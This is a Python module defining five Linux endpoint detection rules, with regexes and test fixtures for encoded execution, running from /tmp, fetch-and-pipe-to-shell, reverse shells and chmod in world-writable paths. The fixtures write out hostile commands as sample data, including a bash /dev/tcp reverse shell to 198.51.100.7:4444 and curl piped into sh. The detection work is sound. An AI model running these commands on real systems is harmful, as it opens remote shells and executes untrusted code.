"""Linux endpoint detection pack · P0-F.

Authored with the EXISTING `DetectionRuleContent` model — there is no EDR
rule model, no EDR registry and no EDR evaluator. These rules are
evaluated by the same `library/registry.py::evaluate_event` that already
serves every other source.

Five rules only, deliberately. Each one describes behaviour the REAL
`agents/nivxforge-linux` sensor genuinely produces (process image,
command line, parent lineage, file path) and that the canonical schema
can actually represent. Rule count is not a goal; a rule that cannot be
proven against real telemetry is worse than no rule, because it teaches
an analyst to distrust the ones that can.

Every predicate reads only observed evidence. A missing command line is
never treated as an empty string that "does not contain" something
suspicious — absence of evidence is not evidence of benignity, so a rule
simply does not fire rather than implying the activity was clean.
"""
from __future__ import annotations

import re
from typing import Any, Dict, List

from .models import (DetectionFixture, DetectionRuleContent, Platform,
                     Severity, Tactic)

WORLD_WRITABLE = ("/tmp/", "/var/tmp/", "/dev/shm/")

_B64_DECODE = re.compile(
    r"base64\s+(-d|--decode|-di\b)|openssl\s+enc\s+-d\s+-base64", re.I)
_FETCH_PIPE_SHELL = re.compile(
    r"\b(curl|wget)\b[^|;]*[|]\s*(sudo\s+)?(ba|z|k|da)?sh\b", re.I)
_REVERSE_SHELL = re.compile(
    r"/dev/tcp/[^\s/]+/\d+|\bnc\b[^|;]*\s-[a-z]*e\s|\bncat\b[^|;]*--exec",
    re.I)
_CHMOD_EXEC = re.compile(r"\bchmod\b[^;|]*(\+x|[0-7]*7[0-7]{2})", re.I)
_SHELLS = ("sh", "bash", "dash", "zsh", "ksh")
_SERVICE_PARENTS = ("nginx", "httpd", "apache2", "java", "tomcat", "php-fpm",
                    "postgres", "mysqld", "redis-server", "node")


def _proc(ev: Dict[str, Any]) -> Dict[str, Any]:
    p = ev.get("process")
    return p if isinstance(p, dict) else {}


def _cmd(ev: Dict[str, Any]) -> str:
    """The observed command line, or empty when it was NOT observed.

    Callers must treat empty as 'no evidence', never as 'nothing
    suspicious was run'.
    """
    c = _proc(ev).get("command_line")
    return c if isinstance(c, str) else ""


def _image(ev: Dict[str, Any]) -> str:
    p = _proc(ev)
    return str(p.get("executable_path") or p.get("name") or "")


_INTERPRETERS = _SHELLS + ("python", "python3", "perl", "ruby", "php",
                           "node", "lua", "awk")


def _world_writable_script(ev: Dict[str, Any]) -> bool:
    """An interpreter running a script that LIVES in a world-writable path.

    A script executed from /tmp shows the INTERPRETER as its kernel image
    (`/usr/bin/dash` for `#!/bin/sh`) with the script as an argument, so
    the image path alone never sees it. Requiring the image to be an
    interpreter keeps this precise: `cat /tmp/notes.txt` and
    `chmod +x /tmp/x` are not execution from /tmp and do not match.
    """
    c = _cmd(ev)
    if not c:
        return False
    image_base = _image(ev).rsplit("/", 1)[-1]
    if image_base not in _INTERPRETERS:
        return False
    return any(t.startswith(WORLD_WRITABLE) for t in c.split()[1:])


def _is_endpoint(ev: Dict[str, Any]) -> bool:
    """Only NivXForge endpoint evidence is in scope for this pack, so a
    Windows or network source can never be judged by a Linux rule."""
    return (ev.get("source_product") == "LinuxSensor"
            and ev.get("source_vendor") == "NivXForge")


def _fx(name, ev, should, why) -> DetectionFixture:
    return DetectionFixture(name=name, event=ev, should_match=should,
                            rationale=why)


def _ep(process=None, cmd=None, path=None, parent=None) -> Dict[str, Any]:
    return {"source_vendor": "NivXForge", "source_product": "LinuxSensor",
            "process": {"name": process, "executable_path": process,
                        "command_line": cmd, "parent_name": parent},
            "file": {"path": path}}


EDR_LINUX_DETECTION_RULES: List[DetectionRuleContent] = [
    DetectionRuleContent(
        rule_id="EDR-LNX-001",
        name="Base64-decoded payload piped into a shell",
        description=("A command line that decodes base64 and feeds the "
                     "result to an interpreter. Encoding the payload is a "
                     "deliberate act to defeat command-line inspection."),
        tactic=Tactic.DEFENSE_EVASION,
        technique_id="T1027", technique_name="Obfuscated Files or Information",
        platform=Platform.LINUX, severity=Severity.HIGH, confidence="high",
        lane="endpoint",
        predicate=lambda ev: bool(
            _is_endpoint(ev) and _cmd(ev) and _B64_DECODE.search(_cmd(ev))
            and re.search(r"[|]\s*(sudo\s+)?(ba|z|k|da)?sh\b|"
                          r"\b(ba|z|k|da)?sh\s+-c\b", _cmd(ev), re.I)),
        telemetry_requirements=["process.command_line"],
        false_positive_notes=("Build and packaging scripts legitimately "
                              "decode base64; the pipe into an interpreter "
                              "is what raises this above noise."),
        mitre_attack=["T1027", "T1059.004"],
        tags=["linux", "endpoint", "nivxforge", "encoded-execution"],
        fixtures=[
            _fx("encoded payload piped to bash",
                _ep("/bin/bash", "bash -c echo aWQ= | base64 -d | bash"),
                True, "decode + interpreter in one line"),
            _fx("plain base64 encode is not execution",
                _ep("/usr/bin/base64", "base64 /etc/hostname"), False,
                "no decode, no interpreter"),
        ]),
    DetectionRuleContent(
        rule_id="EDR-LNX-002",
        name="Execution from a world-writable directory",
        description=("A process whose image lives in /tmp, /var/tmp or "
                     "/dev/shm. Legitimate software is not installed "
                     "where any user can rewrite it."),
        tactic=Tactic.EXECUTION,
        technique_id="T1059", technique_name="Command and Scripting Interpreter",
        platform=Platform.LINUX, severity=Severity.MEDIUM, confidence="high",
        lane="endpoint",
        predicate=lambda ev: bool(
            _is_endpoint(ev) and (_image(ev).startswith(WORLD_WRITABLE)
                                  or _world_writable_script(ev))),
        telemetry_requirements=["process.executable_path",
                                "process.command_line"],
        false_positive_notes=("Some installers and CI runners execute from "
                              "/tmp. Correlate with lineage and the file "
                              "write that created the image."),
        mitre_attack=["T1059", "T1036"],
        tags=["linux", "endpoint", "nivxforge", "world-writable"],
        fixtures=[
            _fx("payload run from /tmp", _ep("/tmp/.x/payload",
                                             "/tmp/.x/payload"), True,
                "image path is world-writable"),
            _fx("script run from /tmp via an interpreter",
                _ep("/usr/bin/dash", "/bin/sh /tmp/x/payload.sh"), True,
                "kernel image is the interpreter; argv[0] is the "
                "world-writable script that was actually run"),
            _fx("system binary", _ep("/usr/bin/curl", "curl https://x"),
                False, "image path is not world-writable"),
            _fx("a command that merely mentions /tmp is not execution "
                "from /tmp",
                _ep("/usr/bin/cat", "cat /tmp/notes.txt"), False,
                "argv[0] is /usr/bin/cat"),
        ]),
    DetectionRuleContent(
        rule_id="EDR-LNX-003",
        name="Remote content fetched and piped directly to an interpreter",
        description=("curl or wget whose output is piped straight into a "
                     "shell. The payload never touches disk, so file-based "
                     "controls never see it."),
        tactic=Tactic.COMMAND_AND_CONTROL,
        technique_id="T1105", technique_name="Ingress Tool Transfer",
        platform=Platform.LINUX, severity=Severity.HIGH, confidence="high",
        lane="endpoint",
        predicate=lambda ev: bool(
            _is_endpoint(ev) and _cmd(ev)
            and _FETCH_PIPE_SHELL.search(_cmd(ev))),
        telemetry_requirements=["process.command_line"],
        false_positive_notes=("Vendor install one-liners use this exact "
                              "pattern; it is a real risk, not a false "
                              "positive — judge it with lineage and "
                              "destination."),
        mitre_attack=["T1105", "T1059.004"],
        tags=["linux", "endpoint", "nivxforge", "fetch-execute"],
        fixtures=[
            _fx("curl piped to sh",
                _ep("/bin/bash", "bash -c curl -s http://x/a.sh | sh"),
                True, "fetch piped into interpreter"),
            _fx("curl to file only",
                _ep("/usr/bin/curl", "curl -o /tmp/a.sh http://x/a.sh"),
                False, "no interpreter in the pipeline"),
        ]),
    DetectionRuleContent(
        rule_id="EDR-LNX-004",
        name="Reverse-shell shaped command line",
        description=("A command line that binds an interactive shell to a "
                     "socket, via bash /dev/tcp or netcat with an exec "
                     "flag."),
        tactic=Tactic.COMMAND_AND_CONTROL,
        technique_id="T1071", technique_name="Application Layer Protocol",
        platform=Platform.LINUX, severity=Severity.CRITICAL,
        confidence="high", lane="endpoint",
        predicate=lambda ev: bool(
            _is_endpoint(ev) and _cmd(ev)
            and _REVERSE_SHELL.search(_cmd(ev))),
        telemetry_requirements=["process.command_line"],
        false_positive_notes=("Connectivity checks occasionally use "
                              "/dev/tcp; an interactive shell redirected "
                              "into it is not a connectivity check."),
        mitre_attack=["T1071", "T1059.004"],
        tags=["linux", "endpoint", "nivxforge", "reverse-shell"],
        fixtures=[
            _fx("bash /dev/tcp reverse shell",
                _ep("/bin/bash",
                    "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"),
                True, "interactive shell bound to a socket"),
            _fx("ordinary ssh", _ep("/usr/bin/ssh", "ssh user@host"), False,
                "no socket-bound shell"),
        ]),
    DetectionRuleContent(
        rule_id="EDR-LNX-005",
        name="Execute permission granted to a file in a world-writable path",
        description=("chmod +x applied to a path under /tmp, /var/tmp or "
                     "/dev/shm — the step that turns dropped content into "
                     "an executable payload."),
        tactic=Tactic.DEFENSE_EVASION,
        technique_id="T1222.002",
        technique_name="Linux and Mac File and Directory Permissions Modification",
        platform=Platform.LINUX, severity=Severity.MEDIUM, confidence="high",
        lane="endpoint",
        predicate=lambda ev: bool(
            _is_endpoint(ev) and _cmd(ev) and _CHMOD_EXEC.search(_cmd(ev))
            and any(w in _cmd(ev) for w in WORLD_WRITABLE)),
        telemetry_requirements=["process.command_line"],
        false_positive_notes=("CI pipelines chmod scripts in /tmp; pair "
                              "with what executes next."),
        mitre_attack=["T1222.002"],
        tags=["linux", "endpoint", "nivxforge", "drop-and-arm"],
        fixtures=[
            _fx("arm a dropped payload",
                _ep("/usr/bin/chmod", "chmod +x /tmp/.x/payload"), True,
                "execute bit on a world-writable path"),
            _fx("chmod inside a home directory",
                _ep("/usr/bin/chmod", "chmod +x /root/build.sh"), False,
                "path is not world-writable"),
        ]),
]
